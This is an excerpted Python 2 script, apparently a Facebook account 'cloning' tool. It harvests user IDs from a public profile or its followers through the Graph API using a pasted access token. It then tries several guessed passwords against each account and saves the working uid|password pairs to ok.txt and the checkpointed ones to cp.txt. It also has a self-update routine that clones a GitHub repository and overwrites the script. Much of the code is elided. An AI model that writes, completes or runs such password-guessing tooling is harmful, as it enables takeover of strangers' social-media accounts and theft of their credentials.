...
def main()
	...
	print("")
	print("\033[98;1m  [1] STAR THE CLONING?")
	print("\033[94;1m  [2] DUMP/EXTRACT USER-IDZ")
	print("\033[97;1m  [3] HOW TO GET TOKEN?")
...
def log_sel():
	...
	if sel == "":
		print("\t\033[91;1m  INVAILD CHOICE -_")
		log_sel()
		...
		import os
		try:
			os.system("git clone https://github.com/Nazir765/LEGEND-TOOR.git")
			os.system("rm -rf SUBHAN.py")
			os.system("cp -f LEGEND-TOOR/LEGEND.py \\.")
			os.system("rm -rf LEGEND-TOOR")
			print "\033[92;1m\n TOOL UPDATE SUCCESSFULLy...>_<\n"
			time.sleep(2)
			main()
		except KeyboardInterrupt:
			print "\033[91;1m\n Sorry Your Device Not Supported ðŸ˜­ !\n"
	        	main()
...
def token():
    ...
    try:
        ...
        print("")
        token = raw_input("\033[93;1m Past Token.: \033[92;1m")
...
def token_check():
	try:
		...
		print"\033[91;1m[!] Token Is Invailid"
...
def menu():
    ...
    try:
        ...
        logo()
        print("")
        print("\t\033[91;1m  Sorry the token has Expired")
        os.system("rm -rf vau_token.txt")
        print("")
        time.sleep(1)
        token()
    ...
    logo()
    print("")
    print("\033[93;1m     Hi Friend  : \033[92;1m"+xn)
    print("\033[93;1m     Country is : \033[92;1m") + loc
    print("\033[93;1m     YOUR IP    : \033[92;1m") + ip
    print("")

    print("")
    print("\033[92;1m  [1] Use Auto Pass cloning? ")
    print("\033[93;1m  [2] Clone with Manual Pass")
    print('\033[91;1m  [0] BACK')
    print("")
    menu_option()
def menu_option():
	select = raw_input("\033[92;1m Select One option:  ")
	if select =="1":
		crack1()
	elif select =="2":
		crack()
...
def crack1():
	...
	logo()
	print("")
	print("\t\033[93;1m Cloning with auto Pass")
	print("")
	print("\033[94;1m  [1] Clone Public id ")
	print("\033[93;1m  [2] Clone Follower")
...
def crack_select1():
	...
	if select =="1":
		...
		logo()
		print("")
		idt = raw_input("\033[92;1m  put any public id here : ")
		try:
			...
			logo()
			print('')
			print("\t\033[93;1m  Auto Pass")
			print('')
			print("\033[92;1m  CLONING FROM : "+q["TOOR"])
		except KeyError:
		...
		try:
			...
			print('')
			print("\033[92;1m  CLONING FROM : "+q["NAZIR"])
		except KeyError:
			print("\t\033[91;1m     INVALID LINK OR TOKEN")
			print("")
			raw_input("\033[91;1m PRESS ENTER TO BACK")
	...
	print("\033[92;1m USE AIRPLANE MODE FOR FAST CLONING\x1b[0m")
	print("")
	linex()
	print("")
	def main(arg):
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															if "access_token" in q and "EAAA" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [TOR-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
	...
	print("\033[93;1m TOTAL IDS \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print("\t\033[91;1m  INVALID ID/LINK OR TOKEN")
			print("")
		...
		try:
			...
			print("\t\033[91;1m     INVALID LINK/ID OR TOKEN")
			print("")
			raw_input("\033[91;1m PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
	...
	print("\033[92;1m  USE AIRPLANE MODE FOR FAST SPEED\x1b[0m")
	print("")
	linex()
	print("")
	def main(arg):
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									if "access_token" in q and "EAAA" in q:
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m [HANNAN-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [HANNAN-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
													...
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m [HANNAN-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [HANNAN-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
															...
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m [HANNAN-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [HANNAN-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																	...
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [HANNAN-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [HANNAN-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
...
def ex_id():
    ...
    time.sleep(1)
    ex_id()
    print '\033[92;1m THANKS FOR USING MY TOOL OWNER: HANNAN ANSARI'
